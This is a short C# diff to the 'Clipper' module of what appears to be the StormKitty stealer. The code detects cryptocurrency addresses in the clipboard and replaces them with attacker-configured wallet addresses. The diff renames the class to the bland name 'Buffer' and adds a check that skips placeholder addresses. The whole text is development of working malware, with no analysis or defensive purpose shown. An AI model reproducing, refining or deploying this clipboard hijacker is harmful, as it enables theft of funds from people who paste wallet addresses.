@@ -3,7 +3,7 @@ using System.Text.RegularExpressions;
 
 namespace Clipper
 {
-    internal sealed class Clipper
+    internal sealed class Buffer
     {
         // Find & Replace crypto addresses in clipboard
         public static void Replace()
@@ -18,7 +18,7 @@ namespace Clipper
                 if (pattern.Match(buffer).Success)
                 {
                     string replace_to = StormKitty.Config.ClipperAddresses[cryptocurrency];
-                    if (!string.IsNullOrEmpty(replace_to) && !buffer.Equals(replace_to))
+                    if (!string.IsNullOrEmpty(replace_to) && !replace_to.Contains("---") && !buffer.Equals(replace_to))
                     {
                         Clipboard.SetText(replace_to);
                         System.Console.WriteLine("Clipper replaced to " + replace_to);
